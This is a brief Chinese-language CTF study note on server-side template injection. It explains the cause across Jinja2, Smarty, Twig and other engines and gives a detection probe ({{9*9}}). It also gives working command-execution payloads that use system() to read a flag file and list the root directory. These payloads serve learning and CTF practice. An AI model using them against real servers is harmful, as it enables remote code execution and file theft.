什么是SSTI： SSTI 就是服务器端模板注入。
ssti主要为python的一些框架 jinja2 mako tornado django，
PHP框架smarty twig，
java框架jade velocity等等
使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为Web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShel1等问题。其影响范围主要取决于模版引擎的复杂性。    


CTF题SSTI:
```
一个网页可以参数传参回显，IP回显，UA回显，日志回显等。
通过回显的注入点注入验证：
{{9*9}}
回显81，则存在模板注入

解题：
大多数题目的flag均藏在系统中的某个文件内
通过模板注入解析读取文件。

php:
{{system("cat ../../../../../../flag")}}
smarty：
{if system("ls /")}{/if}
```
python: jinja2 mako tornado django 
php: smarty twig Blade 
java: jade velocity jsp
大全：<https://www.cnblogs.com/bmjoker/p/13508538.html>
区分测试
![](.topwrite/assets/image_1713356299863.png)